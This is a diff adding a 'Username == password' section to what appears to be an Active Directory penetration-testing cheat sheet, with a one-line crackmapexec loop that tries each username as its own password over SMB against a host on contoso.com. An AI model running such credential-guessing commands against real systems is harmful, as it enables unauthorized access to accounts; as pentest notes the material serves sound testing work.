@@ -3,6 +3,12 @@
 # Unauthenticated enumeration
 
 # First foothold
+### Username == password
+Using crackmapexec to test for password equal to username on domain contoso.com
+
+```
+for word in $(cat users.txt); do crackmapexec smb 10.10.0.10 -u $word -p $word -d contoso.com; done
+```
 
 # Authenticated enumeration
 
